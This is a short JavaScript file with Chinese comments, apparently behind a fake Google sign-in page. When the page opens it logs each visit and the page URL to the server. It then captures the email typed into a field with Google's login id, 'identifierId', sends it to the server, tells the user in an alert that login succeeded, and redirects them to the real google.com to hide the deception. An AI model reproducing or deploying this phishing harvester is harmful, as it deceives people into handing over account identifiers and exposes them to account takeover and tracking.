const url = window.location.href;

// 進頁面 送 IP 紀錄
fetch('/api/visit', {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ url: url })
});

// 使用者提交 email
const form = document.getElementById("recordingLoginIdentifierId");
form.addEventListener("submit", function (event) {
  event.preventDefault(); // 阻止表單送出刷新頁面

  const email = document.getElementById("identifierId").value;
  fetch('/api/login', {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email: email, url: url })
  })
  .then(response => {
      if (!response.ok) throw new Error("伺服器錯誤");
      return response.json();
    })
  .then(data => {
      alert(`歡迎，${email}！您已成功登入。`);
      window.location.href = "https://www.google.com";
    })
    .catch(err => {
      alert("⚠️ 登入失敗：" + err.message);
      console.error(err);
    });
});
